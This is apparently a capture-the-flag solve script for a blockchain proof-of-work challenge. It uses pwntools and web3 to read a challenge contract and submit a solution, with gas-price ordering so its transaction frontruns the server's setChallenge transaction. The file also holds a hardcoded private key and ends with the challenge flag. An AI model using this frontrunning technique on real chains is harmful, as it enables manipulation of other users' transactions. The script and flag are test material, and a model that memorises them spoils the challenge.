from pwn import remote
from web3 import Web3
from web3.middleware import geth_poa_middleware

from challenge.solve import solve_challenge

PLAYER_ADDR = "0xe32ea99b4c5BE351d90bffF0A02430C3a9A7A65C"
PRIVATE_KEY = "0xd68a1a5cd3ae20bd871ee5c79bf1ad7c4551b380cb19cf0ac71c32b356bd405c"

w3 = Web3(Web3.HTTPProvider("https://floordrop-rpc.hpmv.dev/"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
pow_abi = '[{"inputs":[{"internalType":"bytes","name":"solution","type":"bytes"},{"internalType":"uint256","name":"solver_nonce","type":"uint256"}],"name":"solveChallenge","outputs":[],"stateMutability":"nonpayable","type":"function"}]'
nonce = w3.eth.get_transaction_count(PLAYER_ADDR)


def main():
    r = remote("mc.ax", 32123, level="DEBUG")

    r.recvuntil(b"Please choose an option: ")
    r.sendline(b"2")

    r.recvuntil(b"Challenge contract deployed at ")
    challenge_contract_addr = r.recvline().strip()
    pow = w3.eth.contract(address=challenge_contract_addr.decode(), abi=pow_abi)

    r.recvuntil(b"Challenge nonce: ")
    challenge_nonce = int(r.recvline().strip(), 16)

    r.recvuntil(b"Sent setChallenge transaction ")

    unsent_tx = {
        "chainId": 133713371337,
        "from": PLAYER_ADDR,
        "to": PLAYER_ADDR,
        "value": 1,
        "nonce": nonce,
        "gas": 30000,
        "gasPrice": 2000000016,
    }
    signed_tx = w3.eth.account.sign_transaction(unsent_tx, private_key=PRIVATE_KEY)

    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    print(f"{tx_hash=}")

    setchallenge_tx_hash = r.recvuntil(b";", drop=True).strip().decode()
    setchallenge_tx = w3.eth.get_transaction(setchallenge_tx_hash)
    base = int(setchallenge_tx["input"][4:].hex(), 16)

    solution = solve_challenge(base)
    unsent_tx = pow.functions.solveChallenge(
        solution.to_bytes((solution.bit_length() + 7) // 8, "big"), challenge_nonce
    ).build_transaction(
        {"from": PLAYER_ADDR, "nonce": nonce + 1, "gas": 900000, "gasPrice": 3000000016}
    )
    signed_tx = w3.eth.account.sign_transaction(unsent_tx, private_key=PRIVATE_KEY)

    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    print(f"{tx_hash=}")

    r.recvall()


if __name__ == "__main__":
    main()

# dice{fr0ntrunn1ng_1s_n0t_ju5t_f0r_s4ndw1ch1ng_f8d9f834}
